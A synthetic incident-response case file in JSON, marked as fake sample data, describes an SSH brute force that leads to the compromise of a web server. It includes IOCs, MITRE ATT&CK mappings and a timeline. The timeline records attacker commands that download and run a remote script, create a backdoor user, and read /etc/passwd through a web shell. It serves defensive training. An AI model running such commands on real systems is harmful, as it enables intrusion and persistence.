@@ -1,0 +1,257 @@
+{
+  "_notice": "FAKE SAMPLE DATA - synthetic case produced by demo.py from the sample logs.",
+  "case_id": "INC-FAKE-001",
+  "analyst": "Sujith Kumar",
+  "created": "2026-10-28 04:00 UTC",
+  "title": "SSH brute force leading to compromise of web01",
+  "verdict": "True positive",
+  "severity": "CRITICAL",
+  "notice": "All data in this report is FAKE sample data.",
+  "categories": [
+    "brute_force",
+    "credential_stuffing",
+    "impossible_travel",
+    "password_spray",
+    "phishing_email",
+    "valid_account_login"
+  ],
+  "summary": "203.0.113.45 made 22 failed SSH logins against web01 within a few minutes (including several non-existent usernames), then logged in successfully as 'deploy'. Shortly afterwards the account ran curl and useradd through sudo, a web shell was requested from the same IP, and web01 began beaconing to 198.51.100.77 on port 4444. Both IPs are on the local blocklist. A separate phishing email, a password spray and a distributed attack on 'admin' were also detected.",
+  "evidence": [
+    {
+      "title": "Brute force with success",
+      "detail": "A successful login for 'deploy' from the same IP followed at 2026-10-28T02:17:28Z. The attacker may now have a valid account."
+    },
+    {
+      "title": "Suspicious privileged commands",
+      "detail": "sudo curl http://198.51.100.77/x.sh and sudo useradd support2 by user deploy"
+    },
+    {
+      "title": "Web shell",
+      "detail": "GET /uploads/shell.php?cmd=id from the attacker IP"
+    },
+    {
+      "title": "Command-and-control beaconing",
+      "detail": "6 outbound connections to 198.51.100.77:4444 about 5 minutes apart"
+    },
+    {
+      "title": "Phishing email",
+      "detail": "02_phish_paypal_lookalike.eml scored 100/100 (CRITICAL)"
+    }
+  ],
+  "iocs": {
+    "ip": [
+      "192.0.2.60",
+      "198.51.100.200",
+      "198.51.100.77",
+      "203.0.113.45",
+      "203.0.113.77"
+    ],
+    "domain": [
+      "bulk-sender.example",
+      "login.paypa1-secure.example",
+      "mail-collector.example",
+      "mail.paypa1-secure.example",
+      "mx.victim-corp.example",
+      "paypa1-secure.example",
+      "relay.bulk-sender.example",
+      "sample.example",
+      "victim-corp.example",
+      "www.paypal.com"
+    ],
+    "url": [
+      "http://198.51.100.77/verify",
+      "http://login.paypa1-secure.example/verify",
+      "https://www.paypal.com/verify"
+    ],
+    "email": [
+      "80953@sample.example",
+      "alice@victim-corp.example",
+      "bounce@bulk-sender.example",
+      "helpdesk-paypal@mail-collector.example",
+      "service@paypa1-secure.example"
+    ],
+    "sha256": []
+  },
+  "attack": [
+    {
+      "behaviour": "port_scan",
+      "technique_id": "T1046",
+      "name": "Network Service Discovery",
+      "tactics": "Discovery",
+      "why": "One source touching many ports and getting denied.",
+      "url": "https://attack.mitre.org/techniques/T1046/"
+    },
+    {
+      "behaviour": "c2_beaconing",
+      "technique_id": "T1071",
+      "name": "Application Layer Protocol",
+      "tactics": "Command and Control",
+      "why": "Regular, repeated outbound connections to the same external IP and port.",
+      "url": "https://attack.mitre.org/techniques/T1071/"
+    },
+    {
+      "behaviour": "impossible_travel",
+      "technique_id": "T1078",
+      "name": "Valid Accounts",
+      "tactics": "Defense Evasion, Persistence, Privilege Escalation, Initial Access",
+      "why": "Two distant logins too close in time usually means the credentials are in two different hands.",
+      "url": "https://attack.mitre.org/techniques/T1078/"
+    },
+    {
+      "behaviour": "tool_download",
+      "technique_id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactics": "Command and Control",
+      "why": "curl or wget downloading a script from an unknown server.",
+      "url": "https://attack.mitre.org/techniques/T1105/"
+    },
+    {
+      "behaviour": "brute_force",
+      "technique_id": "T1110",
+      "name": "Brute Force",
+      "tactics": "Credential Access",
+      "why": "Many failed logins from one source in a short time is the textbook fingerprint.",
+      "url": "https://attack.mitre.org/techniques/T1110/"
+    },
+    {
+      "behaviour": "password_spray",
+      "technique_id": "T1110.003",
+      "name": "Brute Force: Password Spraying",
+      "tactics": "Credential Access",
+      "why": "One source touching many different usernames with only a few tries each.",
+      "url": "https://attack.mitre.org/techniques/T1110/003/"
+    },
+    {
+      "behaviour": "credential_stuffing",
+      "technique_id": "T1110.004",
+      "name": "Brute Force: Credential Stuffing",
+      "tactics": "Credential Access",
+      "why": "One account failing from many different IPs.",
+      "url": "https://attack.mitre.org/techniques/T1110/004/"
+    },
+    {
+      "behaviour": "account_creation",
+      "technique_id": "T1136",
+      "name": "Create Account",
+      "tactics": "Persistence",
+      "why": "useradd or similar run by a compromised account.",
+      "url": "https://attack.mitre.org/techniques/T1136/"
+    },
+    {
+      "behaviour": "webshell",
+      "technique_id": "T1505.003",
+      "name": "Server Software Component: Web Shell",
+      "tactics": "Persistence",
+      "why": "Requests such as /uploads/shell.php?cmd=...",
+      "url": "https://attack.mitre.org/techniques/T1505/003/"
+    },
+    {
+      "behaviour": "sudo_abuse",
+      "technique_id": "T1548.003",
+      "name": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching",
+      "tactics": "Privilege Escalation, Defense Evasion",
+      "why": "A freshly compromised user running privileged commands.",
+      "url": "https://attack.mitre.org/techniques/T1548/003/"
+    },
+    {
+      "behaviour": "phishing_email",
+      "technique_id": "T1566",
+      "name": "Phishing",
+      "tactics": "Initial Access",
+      "why": "Failed authentication, spoofed sender and urgency in an email.",
+      "url": "https://attack.mitre.org/techniques/T1566/"
+    }
+  ],
+  "timeline": [
+    {
+      "timestamp": "2026-10-28 02:14:01",
+      "message": "ALLOW TCP 203.0.113.45 -> 10.0.0.5:22",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:14:03",
+      "message": "SSH login failed for root from 203.0.113.45",
+      "marker": "FIRST FAILED LOGIN from 203.0.113.45"
+    },
+    {
+      "timestamp": "2026-10-28 02:14:12",
+      "message": "SSH login failed for admin from 203.0.113.45",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:14:20",
+      "message": "SSH attempt for non-existent user ubuntu from 203.0.113.45",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:14:20",
+      "message": "SSH login failed for ubuntu from 203.0.113.45",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:17:10",
+      "message": "ALLOW TCP 203.0.113.45 -> 10.0.0.5:22",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:17:28",
+      "message": "SSH login succeeded for deploy from 203.0.113.45",
+      "marker": "POSSIBLE COMPROMISE: success after 22 failures from 203.0.113.45"
+    },
+    {
+      "timestamp": "2026-10-28 02:19:05",
+      "message": "sudo by deploy: /usr/bin/curl http://198.51.100.77/x.sh -o /tmp/x.sh",
+      "marker": "SUSPICIOUS PRIVILEGED COMMAND"
+    },
+    {
+      "timestamp": "2026-10-28 02:19:20",
+      "message": "ALLOW TCP 10.0.0.5 -> 198.51.100.77:80",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:19:40",
+      "message": "sudo by deploy: /bin/bash /tmp/x.sh",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:21:03",
+      "message": "ALLOW TCP 10.0.0.5 -> 198.51.100.77:4444",
+      "marker": "FIRST OUTBOUND CONNECTION on unusual port to 198.51.100.77"
+    },
+    {
+      "timestamp": "2026-10-28 02:22:15",
+      "message": "sudo by deploy: /usr/sbin/useradd -m support2",
+      "marker": "SUSPICIOUS PRIVILEGED COMMAND"
+    },
+    {
+      "timestamp": "2026-10-28 02:25:11",
+      "message": "GET /admin/login -> 200",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:25:40",
+      "message": "POST /upload.php -> 200",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:26:02",
+      "message": "GET /uploads/shell.php?cmd=id -> 200",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:26:03",
+      "message": "ALLOW TCP 10.0.0.5 -> 198.51.100.77:4444",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:26:30",
+      "message": "GET /uploads/shell.php?cmd=cat%20/etc/passwd -> 200",
+      "marker": ""
+    },
+    {
+      "timestamp": "2026-10-28 02:31:04",
+      "message": "ALLOW TCP 10.0.0.5 -> 198.51.100.77:4444",
+      "marker": ""
+    }
+  ]
+}
